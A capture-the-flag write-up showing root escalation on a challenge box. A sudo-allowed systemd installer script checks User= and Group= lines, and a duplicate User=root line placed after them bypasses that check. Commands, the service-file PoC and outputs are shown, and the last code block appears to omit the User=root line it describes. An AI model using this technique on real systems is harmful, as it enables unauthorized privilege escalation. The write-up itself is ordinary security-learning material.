# OMM API root
*Disclaimer: We solved this challenge after the CTF had ended. During the ctf we got to the very last step trying to bypass the if-check, but ran out of time.*

We currently have shell as the `f_omm_app` user. In the `OMM API user` challenge we got a reverse shell, which we now have upgraded to a ssh-shell by adding our ssh-publickey to `/home/f_omm_app/.ssh/authorized_keys`.
```
f_omm_app@ip-10-128-3-164:~$ id
uid=1002(f_omm_app) gid=1003(f_omm_app) groups=1003(f_omm_app),1001(hpc_users_rd)
```

`f_omm_app` have sudo permissions on the box, but only for certain commmands.
```
f_omm_app@ip-10-128-3-164:~$ sudo -l
Matching Defaults entries for f_omm_app on ip-10-128-3-164:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin\:/opt/pbs/bin, use_pty

User f_omm_app may run the following commands on ip-10-128-3-164:
    (ALL : ALL) NOPASSWD: /opt/pbs/bin/qsub, /opt/pbs/bin/qdel, /prog/util/sbin/appsysctladd, /usr/bin/systemctl restart *
```

The first two scripts, `/opt/pbs/bin/qsub` and `/opt/pbs/bin/qdel` doesn't do much.
```
f_omm_app@ip-10-128-3-164:~$ cat /opt/pbs/bin/qsub
#!/bin/sh
# This is just mocked handling for this CTF. This is not the file you're looking for"
echo "OK"
f_omm_app@ip-10-128-3-164:~$ cat /opt/pbs/bin/qdel
#!/bin/sh
# This is just mocked handling for this CTF. This is not the file you're looking for"
echo "OK"
```

The command `/usr/bin/systemctl restart *` allows us to restart the systemctl services, but does not turn out to be very useful for us.

[/prog/util/sbin/appsysctladd](./appsysctladd.sh) is the most interesting script that we can run.
`appsysctladd` is a bash script which takes one or more directories as arguments. For each directory-argument given it searches for the directory `$HOSTNAME` in it and starts `systemctl` services for each `.service` file located in that directory. This means that if we create a service file with `User=root` the created service should execute our defined command as `root`!
```
f_omm_app@ip-10-128-3-164:/dev/shm$ ls
eic-hostkey-MGy07Txb  ip-10-128-3-164

f_omm_app@ip-10-128-3-164:/dev/shm$ ls ip-10-128-3-164/
test.service

f_omm_app@ip-10-128-3-164:/dev/shm$ cat ip-10-128-3-164/test.service
[Service]
Type=simple
ExecStart=/bin/bash -c "id > /tmp/output"
User=root

[Install]

```

```
f_omm_app@ip-10-128-3-164:/dev/shm$ sudo /prog/util/sbin/appsysctladd /dev/shm
appsysctladd: Looking up systemctl services for  under /dev/shm
appsysctladd: /dev/shm/ip-10-128-3-164/test.service was rejected. User and Group must match file user and group
```

Unfortunately, that would be too easy. Looking closer into the `/prog/util/sbin/appsysctladd` script we can see the following if-check:
```bash
U=$( stat -c '%U' "${SRV}" )
G=$( stat -c '%G' "${SRV}" )

if egrep -q "^User=${U}$" "${SRV}" && egrep -q "^Group=${G}$" "${SRV}"
then
    SRVNAME=$( basename "${SRV}" )
    echo "$PROG: Setting up systemd service from ${SRV}"
    install -g root -o root -m 644 "${SRV}" "${SYSTEMD}/${SRVNAME}" && \
    systemctl daemon-reload && \
    systemctl start "${SRVNAME}" && \
    systemctl enable "${SRVNAME}"
else
    echo "$PROG: ${SRV} was rejected. User and Group must match file user and group"
fi
```

The script gets the username and group of the owner of the file, and checks if it matches the `User` and `Group` set in the service file. The intention of this is to make users only able to create services running with the same privilege level as them. This check is however not bulletproff, as it only checks if `User=f_omm_app` and `Group=f_omm_app` *exist* in the service file. So what happens if the service file contains the following?
```
User=f_omm_app
Group=f_omm_app
User=root
```

Turns out, when a field is set *twice* it is the *latest* occurrence of the field that takes precedence. Thus, we can bypass the if-check in the `appsysctladd` script by including `User=f_omm_app` (because we have to), and then afterwards set `User=root` to make the service execute as root.
```
f_omm_app@ip-10-128-3-164:/dev/shm$ cat ip-10-128-3-164/test.service
[Service]
Type=simple
ExecStart=/bin/bash -c "id > /tmp/output"
User=f_omm_app
Group=f_omm_app

uid=0(root) gid=1003(f_omm_app) groups=1003(f_omm_app)
```

As we can see, the service runs as `root` now. With this knowledge, we can swap out the `ExecStart` POC with a reverse shell to become root, and then get the flag!
